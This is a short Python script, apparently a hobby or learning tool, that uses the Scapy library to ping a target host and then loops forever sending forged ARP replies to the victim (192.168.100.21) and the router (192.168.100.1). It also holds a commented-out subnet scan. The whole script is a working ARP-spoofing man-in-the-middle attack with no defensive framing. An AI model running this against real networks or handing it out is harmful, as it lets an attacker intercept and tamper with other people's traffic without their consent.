from scapy.all import *

target_ip = "192.168.100.21"
router_ip = "192.168.100.1"
"""
subnet = "192.168.100.0/24"
arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet)
answered,_= srp(arp_request, timeout=2, verbose=0)
for send, recv in answered:
    print(recv.psrc, recv.hwsrc)
"""
pkt = IP(dst=target_ip)/ICMP()
response = sr1(pkt, timeout=2)

if response:
    print("[+] ping packet successfully requested! received from : ", response.src)
else:
    print("[-] response failed!")

arp_response_victim = ARP(pdst=target_ip, psrc=router_ip, op=2)
arp_response_router = ARP(pdst=router_ip, psrc=target_ip, op=2)

while True:
    if True:
        send(arp_response_victim, verbose=0)
        send(arp_response_router, verbose=0)
        time.sleep(2)
        print("[+] arpspoofing attack successfully performed!")
    else:
        print("[+] attack failed!")

